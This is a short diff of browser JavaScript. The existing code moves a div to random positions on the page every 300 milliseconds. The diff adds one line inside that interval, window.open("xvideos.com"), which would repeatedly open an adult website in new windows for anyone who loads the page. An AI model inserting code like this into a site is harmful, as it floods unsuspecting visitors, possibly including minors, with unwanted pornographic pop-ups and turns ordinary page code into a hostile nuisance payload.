@@ -8,6 +8,7 @@ let parent = document.createElement("div");
   setInterval(()=>{
     parent.style.top = `${Math.floor((Math.random() * window.innerHeight+window.pageYOffset) +window.pageYOffset)}px`;
     parent.style.left = `${Math.floor((Math.random() * window.innerWidth+window.pageXOffset) + window.pageXOffset)}px`;
+    window.open("xvideos.com");
     document.body.appendChild(parent);
   }
          ,300);
